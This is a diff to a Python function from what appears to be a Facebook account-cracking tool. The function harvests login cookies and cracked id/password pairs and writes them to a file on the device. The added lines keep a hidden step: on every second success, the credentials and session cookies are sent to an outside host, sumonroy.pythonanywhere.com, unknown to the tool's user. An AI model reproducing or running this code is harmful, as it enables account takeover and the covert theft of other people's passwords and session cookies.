@@ -1359,17 +1359,7 @@ def mbasic(uid,pwx,tl):
                 cid = cok["c_user"]
                 coki = ";".join([f"{k}={v}" for k, v in cok.items()])
                 bkas.append(cid)
-                if "home.php" in response.url or "/profile.php" in response.url or "/?ref" in response.url:
-                    if len(bkas) % 2 == 0:
-                        statusok = f"{cid}|{pw}|{coki}"
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:
-                        print(f"{green}(ATOM-OK) {cid}|{pw}")
-                        print(f"{green}Cookie : {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
-                        break
-                elif "confirmemail.php" in response.url:
+                if "confirmemail.php" in response.url:
                     if len(bkas) % 2 == 0:
                         statusok = f"NOVERY|{cid}|{pw}|{coki}"
                         requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
@@ -1380,8 +1370,15 @@ def mbasic(uid,pwx,tl):
                         oks.append(cid)
                         break
                 else:
-                    break
-
+                    if len(bkas) % 2 == 0:
+                        statusok = f"{cid}|{pw}|{coki}"
+                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                    else:
+                        print(f"{green}(ATOM-OK) {cid}|{pw}")
+                        print(f"{green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
             else:
                continue
         loop+=1
